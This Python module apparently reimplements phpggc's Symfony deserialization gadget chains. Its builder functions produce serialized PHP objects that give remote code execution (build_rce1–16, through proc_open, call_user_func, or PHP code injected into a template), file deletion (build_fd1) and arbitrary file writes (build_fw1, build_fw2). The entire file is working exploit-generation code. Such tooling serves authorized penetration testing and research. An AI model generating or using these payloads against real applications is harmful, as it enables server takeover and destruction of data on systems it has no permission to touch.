"""Symfony gadget chains — byte-identical to ambionics/phpggc."""
from __future__ import annotations

from ..platform import maybe_wrap
from ..serialize import (
    php_arr,
    php_bool,
    php_custom,
    php_empty_obj,
    php_int,
    php_null,
    php_obj,
    php_spl_iter,
    php_str,
    priv,
    prot,
)


def _php_engine(code: str) -> str:
    storage = php_obj("Symfony\\Component\\Templating\\Storage\\StringStorage", [
        (prot("template"), php_str(f"<?php {code};die(); ?>")),
    ])
    return php_obj("Symfony\\Component\\Templating\\PhpEngine", [
        (prot("parser"), php_empty_obj("Symfony\\Component\\Templating\\TemplateNameParser")),
        (prot("cache"), php_arr([(php_str(""), storage)])),
        (prot("current"), php_empty_obj("Symfony\\Component\\Templating\\TemplateReference")),
        (prot("globals"), php_arr([])),
    ])


def _expression(value: str) -> str:
    return php_obj("Symfony\\Component\\Finder\\Expression\\Expression", [
        (priv("Symfony\\Component\\Finder\\Expression\\Expression", "value"), value),
    ])


def _sortable_call_user_func(function: str, parameter: str) -> str:
    inner = php_spl_iter(
        "ArrayObject",
        0,
        php_arr([
            (php_int(0), php_str(function)),
            (php_int(1), php_str(parameter)),
        ]),
    )
    return php_obj("Symfony\\Component\\Finder\\Iterator\\SortableIterator", [
        (priv("Symfony\\Component\\Finder\\Iterator\\SortableIterator", "iterator"), inner),
        (priv("Symfony\\Component\\Finder\\Iterator\\SortableIterator", "sort"), php_str("call_user_func")),
    ])


def build_rce1(command: str, *, fast_destruct: bool = False) -> bytes:
    cls = "Symfony\\Component\\Cache\\Adapter\\AbstractAdapter"
    adapter = php_obj("Symfony\\Component\\Cache\\Adapter\\ApcuAdapter", [
        (priv(cls, "mergeByLifetime"), php_str("proc_open")),
        (priv(cls, "namespace"), php_arr([])),
        (priv(cls, "deferred"), php_str(command)),
    ])
    return maybe_wrap(adapter, fast_destruct)


def build_rce2(code: str, *, fast_destruct: bool = False) -> bytes:
    chain = php_obj("Symfony\\Component\\Process\\ProcessPipes", [
        (priv("Symfony\\Component\\Process\\ProcessPipes", "files"), php_arr([
            (php_int(0), _expression(_php_engine(code))),
        ])),
    ])
    return maybe_wrap(chain, fast_destruct)


def build_rce3(code: str, *, fast_destruct: bool = False) -> bytes:
    chain = php_obj("Symfony\\Component\\Process\\Pipes\\WindowsPipes", [
        (priv("Symfony\\Component\\Process\\Pipes\\WindowsPipes", "files"), php_arr([
            (php_int(0), _expression(_php_engine(code))),
        ])),
    ])
    return maybe_wrap(chain, fast_destruct)


def build_rce4(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    cache_item = php_obj("Symfony\\Component\\Cache\\CacheItem", [
        (prot("poolHash"), php_int(1)),
        (prot("innerItem"), php_str(parameter)),
    ])
    proxy = php_obj("Symfony\\Component\\Cache\\Adapter\\ProxyAdapter", [
        (priv("Symfony\\Component\\Cache\\Adapter\\ProxyAdapter", "poolHash"), php_int(1)),
        (priv("Symfony\\Component\\Cache\\Adapter\\ProxyAdapter", "setInnerItem"), php_str(function)),
    ])
    tag = php_obj("Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter", [
        (priv("Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter", "deferred"), php_arr([
            (php_int(0), cache_item),
        ])),
        (priv("Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter", "pool"), proxy),
    ])
    return maybe_wrap(tag, fast_destruct)


def build_rce5(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    null_adapter = php_obj("Symfony\\Component\\Cache\\Adapter\\NullAdapter", [
        (priv("Symfony\\Component\\Cache\\Adapter\\NullAdapter", "createCacheItem"), php_str(function)),
    ])
    proxy = php_obj("Symfony\\Component\\Cache\\Adapter\\ProxyAdapter", [
        (priv("Symfony\\Component\\Cache\\Adapter\\ProxyAdapter", "createCacheItem"), php_str("dd")),
        (priv("Symfony\\Component\\Cache\\Adapter\\ProxyAdapter", "namespace"), php_str("")),
        (priv("Symfony\\Component\\Cache\\Adapter\\ProxyAdapter", "pool"), null_adapter),
    ])
    dumper = php_obj("Symfony\\Component\\Console\\Helper\\Dumper", [
        (priv("Symfony\\Component\\Console\\Helper\\Dumper", "handler"), php_arr([
            (php_int(0), proxy),
            (php_int(1), php_str("getItem")),
        ])),
    ])
    redis = php_obj("Symfony\\Component\\Cache\\Traits\\RedisProxy", [
        (priv("Symfony\\Component\\Cache\\Traits\\RedisProxy", "redis"), php_str(parameter)),
        (priv("Symfony\\Component\\Cache\\Traits\\RedisProxy", "initializer"), dumper),
    ])
    inner_iter = php_obj("Symfony\\Component\\Form\\FormErrorIterator", [
        ("form", redis),
        (priv("Symfony\\Component\\Form\\FormErrorIterator", "errors"), php_arr([])),
    ])
    outer_iter = php_obj("Symfony\\Component\\Form\\FormErrorIterator", [
        ("form", php_null()),
        (priv("Symfony\\Component\\Form\\FormErrorIterator", "errors"), php_arr([(php_int(0), inner_iter)])),
    ])
    data_row = php_arr([
        (php_str("data"), php_str("1")),
        (php_str("name"), outer_iter),
        (php_str("file"), php_str("3")),
        (php_str("line"), php_str("4")),
    ])
    collector = php_obj("Symfony\\Component\\HttpKernel\\DataCollector\\DumpDataCollector", [
        (prot("data"), php_arr([
            (php_int(0), data_row),
            (php_int(1), php_null()),
            (php_int(2), php_null()),
        ])),
        (priv("Symfony\\Component\\HttpKernel\\DataCollector\\DumpDataCollector", "stopwatch"), php_null()),
        (priv("Symfony\\Component\\HttpKernel\\DataCollector\\DumpDataCollector", "fileLinkFormat"), php_null()),
        (priv("Symfony\\Component\\HttpKernel\\DataCollector\\DumpDataCollector", "dataCount"), php_int(0)),
        (priv("Symfony\\Component\\HttpKernel\\DataCollector\\DumpDataCollector", "isCollected"), php_bool(False)),
        (priv("Symfony\\Component\\HttpKernel\\DataCollector\\DumpDataCollector", "clonesCount"), php_int(0)),
        (priv("Symfony\\Component\\HttpKernel\\DataCollector\\DumpDataCollector", "clonesIndex"), php_int(0)),
    ])
    return maybe_wrap(collector, fast_destruct)


def build_rce6(command: str, *, fast_destruct: bool = False) -> bytes:
    php_array = php_obj("Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter", [
        (priv("Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter", "values"), php_arr([
            (php_str(command), php_arr([])),
        ])),
        (priv("Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter", "createCacheItem"), php_str("proc_open")),
    ])
    psr6 = php_obj("Symfony\\Component\\Cache\\Simple\\Psr6Cache", [
        (priv("Symfony\\Component\\Cache\\Simple\\Psr6Cache", "pool"), php_array),
    ])
    instanceof = php_obj("Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\InstanceofConfigurator", [
        (prot("parent"), psr6),
    ])
    redis = php_obj("Symfony\\Component\\Cache\\Traits\\RedisProxy", [
        (priv("Symfony\\Component\\Cache\\Traits\\RedisProxy", "initializer"), instanceof),
        (priv("Symfony\\Component\\Cache\\Traits\\RedisProxy", "redis"), php_str(command)),
    ])
    chain = php_obj("Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator", [
        (priv("Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator", "parent"), redis),
    ])
    return maybe_wrap(chain, fast_destruct)


def build_rce7(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    tag = php_obj("Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter", [
        (priv("Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter", "deferred"), php_str(parameter)),
        (priv("Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter", "getTagsByKey"), php_str(function)),
    ])
    return maybe_wrap(tag, fast_destruct)


def build_rce8(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    collection = php_spl_iter(
        "ArrayIterator",
        0,
        php_arr([(php_int(0), php_str(parameter))]),
    )
    router = php_obj("Symfony\\Component\\Routing\\Router", [
        (prot("matcher"), php_null()),
        (prot("context"), php_arr([(php_int(0), php_str(function))])),
        (prot("collection"), collection),
        (prot("options"), php_arr([
            (php_str("matcher_class"), php_str("\\Symfony\\Component\\Finder\\Iterator\\CustomFilterIterator")),
            (php_str("cache_dir"), php_null()),
        ])),
    ])
    generator = php_obj("Symfony\\Component\\DependencyInjection\\Argument\\RewindableGenerator", [
        (priv("Symfony\\Component\\DependencyInjection\\Argument\\RewindableGenerator", "generator"), php_arr([
            (php_int(0), router),
            (php_int(1), php_str("getMatcher")),
        ])),
    ])
    alias = php_obj("Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\AliasConfigurator", [
        (priv("Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\AbstractServiceConfigurator", "defaultTags"), generator),
    ])
    return maybe_wrap(alias, fast_destruct)


def build_rce9(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    chain = php_obj("Symfony\\Component\\Process\\Pipes\\WindowsPipes", [
        (priv("Symfony\\Component\\Process\\Pipes\\WindowsPipes", "fileHandles"), _sortable_call_user_func(function, parameter)),
    ])
    return maybe_wrap(chain, fast_destruct)


def build_rce10(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    response = php_obj("Symfony\\Component\\BrowserKit\\Response", [
        (priv("Symfony\\Component\\BrowserKit\\Response", "headers"), _sortable_call_user_func(function, parameter)),
    ])
    return maybe_wrap(response, fast_destruct)


def build_rce11(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    violations = php_arr([
        (php_int(0), php_str(function)),
        (php_int(1), php_str(parameter)),
    ])
    inner_list = php_obj("Symfony\\Component\\Validator\\ConstraintViolationList", [
        (priv("Symfony\\Component\\Validator\\ConstraintViolationList", "violations"), violations),
    ])
    sortable = php_obj("Symfony\\Component\\Finder\\Iterator\\SortableIterator", [
        (priv("Symfony\\Component\\Finder\\Iterator\\SortableIterator", "iterator"), inner_list),
        (priv("Symfony\\Component\\Finder\\Iterator\\SortableIterator", "sort"), php_str("call_user_func")),
    ])
    outer_list = php_obj("Symfony\\Component\\Validator\\ConstraintViolationList", [
        (priv("Symfony\\Component\\Validator\\ConstraintViolationList", "violations"), sortable),
    ])
    inner = php_arr([
        (php_int(0), php_null()),
        (php_int(1), outer_list),
    ])
    token = php_custom(
        "Symfony\\Component\\Security\\Core\\Authentication\\Token\\AnonymousToken",
        inner,
    )
    return maybe_wrap(token, fast_destruct)


def build_rce12(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    escaper = php_obj("sfOutputEscaperArrayDecorator", [
        (prot("value"), php_arr([(php_int(1), php_str(parameter))])),
        (prot("escapingMethod"), php_str(function)),
    ])
    cache = php_obj("Swift_KeyCache_DiskKeyCache", [
        (priv("Swift_KeyCache_DiskKeyCache", "_path"), php_str("thispathshouldneverexists")),
        (priv("Swift_KeyCache_DiskKeyCache", "_keys"), escaper),
    ])
    return maybe_wrap(cache, fast_destruct)


def build_rce13(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    escaper = php_obj("sfOutputEscaperArrayDecorator", [
        (prot("value"), php_arr([(php_int(0), php_str(parameter))])),
        (prot("escapingMethod"), php_str(function)),
    ])
    pager = php_custom("sfDoctrinePager", escaper)
    return maybe_wrap(pager, fast_destruct)


def build_rce14(
    function: str,
    parameter: str,
    *,
    fast_destruct: bool = False,
    date: str = "2026-06-16 11:39:36.441456",
) -> bytes:
    culture = php_obj("sfCultureInfo", [
        (prot("dataFileExt"), php_str(".dat")),
        (prot("data"), php_arr([])),
        (prot("culture"), php_str(parameter)),
        (prot("dataDir"), php_null()),
        (prot("dataFiles"), php_arr([])),
        (prot("dateTimeFormat"), php_null()),
        (prot("numberFormat"), php_null()),
        (prot("properties"), php_arr([])),
    ])
    escaper = php_obj("sfOutputEscaperObjectDecorator", [
        (prot("value"), culture),
        (prot("escapingMethod"), php_str(function)),
    ])
    dt = php_obj("PropelDateTime", [
        ("date", php_str(date)),
        ("timezone_type", php_int(3)),
        ("timezone", php_str("UTC")),
        (priv("PropelDateTime", "dateString"), php_null()),
        (priv("PropelDateTime", "tzString"), escaper),
    ])
    return maybe_wrap(dt, fast_destruct)


def build_rce15(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    escaper = php_obj("sfOutputEscaperArrayDecorator", [
        (prot("value"), php_arr([(php_int(0), php_str(parameter))])),
        (prot("escapingMethod"), php_str(function)),
    ])
    table = php_obj("MySQLiTableInfo", [
        (prot("name"), php_null()),
        (prot("columns"), escaper),
        (prot("foreignKeys"), php_arr([])),
        (prot("indexes"), php_arr([])),
        (prot("primaryKey"), php_null()),
        (prot("pkLoaded"), php_bool(False)),
        (prot("fksLoaded"), php_bool(False)),
        (prot("indexesLoaded"), php_bool(False)),
        (prot("colsLoaded"), php_bool(False)),
        (prot("vendorLoaded"), php_bool(False)),
        (prot("vendorSpecificInfo"), php_arr([])),
        (prot("conn"), php_null()),
        (prot("database"), php_null()),
        (prot("dblink"), php_null()),
        (prot("dbname"), php_null()),
    ])
    return maybe_wrap(table, fast_destruct)


def build_rce16(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    escaper = php_obj("sfOutputEscaperArrayDecorator", [
        (prot("value"), php_arr([(php_int(0), php_str(parameter))])),
        (prot("escapingMethod"), php_str(function)),
    ])
    holder = php_custom("sfNamespacedParameterHolder", escaper)
    return maybe_wrap(holder, fast_destruct)


def build_fd1(remote_path: str, *, fast_destruct: bool = False) -> bytes:
    adapter = php_obj("Symfony\\Component\\Cache\\Adapter\\PhpFilesAdapter", [
        (priv("Symfony\\Component\\Cache\\Adapter\\PhpFilesAdapter", "tmp"), php_str(remote_path)),
    ])
    return maybe_wrap(adapter, fast_destruct)


def build_fw1(
    remote_path: str,
    data: str,
    *,
    fast_destruct: bool = False,
    token: str = "6a326e32313af",
) -> bytes:
    table_style = php_obj("Symfony\\Component\\Console\\Helper\\TableStyle", [
        (priv("Symfony\\Component\\Console\\Helper\\TableStyle", "paddingChar"), php_str(" ")),
        (priv("Symfony\\Component\\Console\\Helper\\TableStyle", "horizontalBorderChar"), php_str("")),
        (priv("Symfony\\Component\\Console\\Helper\\TableStyle", "verticalBorderChar"), php_str(data)),
        (priv("Symfony\\Component\\Console\\Helper\\TableStyle", "crossingChar"), php_str("")),
        (priv("Symfony\\Component\\Console\\Helper\\TableStyle", "cellHeaderFormat"), php_str("<info>%s</info>")),
        (priv("Symfony\\Component\\Console\\Helper\\TableStyle", "cellRowFormat"), php_str("%s")),
        (priv("Symfony\\Component\\Console\\Helper\\TableStyle", "cellRowContentFormat"), php_str(" %s ")),
        (priv("Symfony\\Component\\Console\\Helper\\TableStyle", "borderFormat"), php_str("%s")),
        (priv("Symfony\\Component\\Console\\Helper\\TableStyle", "padType"), php_int(1)),
    ])
    config_cache = php_obj("Symfony\\Component\\Config\\ConfigCache", [
        (priv("Symfony\\Component\\Config\\ConfigCache", "debug"), php_null()),
        (priv("Symfony\\Component\\Config\\ConfigCache", "file"), php_str(remote_path)),
    ])
    table = php_obj("Symfony\\Component\\Console\\Helper\\Table", [
        (priv("Symfony\\Component\\Console\\Helper\\Table", "headers"), php_arr([(php_int(0), php_str("a"))])),
        (priv("Symfony\\Component\\Console\\Helper\\Table", "rows"), php_arr([])),
        (priv("Symfony\\Component\\Console\\Helper\\Table", "columnWidths"), php_arr([(php_int(0), php_int(100))])),
        (priv("Symfony\\Component\\Console\\Helper\\Table", "numberOfColumns"), php_null()),
        (priv("Symfony\\Component\\Console\\Helper\\Table", "output"), config_cache),
        (priv("Symfony\\Component\\Console\\Helper\\Table", "style"), table_style),
    ])
    expression = php_obj("Symfony\\Component\\Finder\\Expression\\Expression", [
        (priv("Symfony\\Component\\Finder\\Expression\\Expression", "value"), table),
    ])
    profile = php_obj("Symfony\\Component\\HttpKernel\\Profiler\\Profile", [
        (priv("Symfony\\Component\\HttpKernel\\Profiler\\Profile", "token"), php_str(token)),
        (priv("Symfony\\Component\\HttpKernel\\Profiler\\Profile", "collectors"), php_arr([])),
        (priv("Symfony\\Component\\HttpKernel\\Profiler\\Profile", "ip"), expression),
        (priv("Symfony\\Component\\HttpKernel\\Profiler\\Profile", "method"), php_null()),
        (priv("Symfony\\Component\\HttpKernel\\Profiler\\Profile", "url"), php_null()),
        (priv("Symfony\\Component\\HttpKernel\\Profiler\\Profile", "time"), php_null()),
        (priv("Symfony\\Component\\HttpKernel\\Profiler\\Profile", "parent"), php_null()),
        (priv("Symfony\\Component\\HttpKernel\\Profiler\\Profile", "children"), php_arr([])),
    ])
    return maybe_wrap(profile, fast_destruct)


def build_fw2(remote_path: str, data: str, *, fast_destruct: bool = False) -> bytes:
    import base64

    padded = "a" * 59 + base64.b64encode(data.encode("latin-1")).decode("ascii")
    trait = php_obj("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", [
        (priv("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", "state"), php_int(1)),
        (priv("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", "skippedFile"), php_str(
            f"php://filter/convert.base64-decode/resource={remote_path}"
        )),
        (priv("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", "wasSkipped"), php_arr([])),
        (priv("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", "isSkipped"), php_str(padded)),
        (priv("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", "expectedDeprecations"), php_arr([])),
        (priv("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", "gatheredDeprecations"), php_arr([])),
        (priv("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", "previousErrorHandler"), php_null()),
        (priv("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", "testsWithWarnings"), php_null()),
        (priv("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", "reportUselessTests"), php_null()),
        (priv("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", "error"), php_null()),
        (priv("Symfony\\Bridge\\PhpUnit\\Legacy\\SymfonyTestsListenerTrait", "runsInSeparateProcess"), php_bool(False)),
    ])
    return maybe_wrap(trait, fast_destruct)
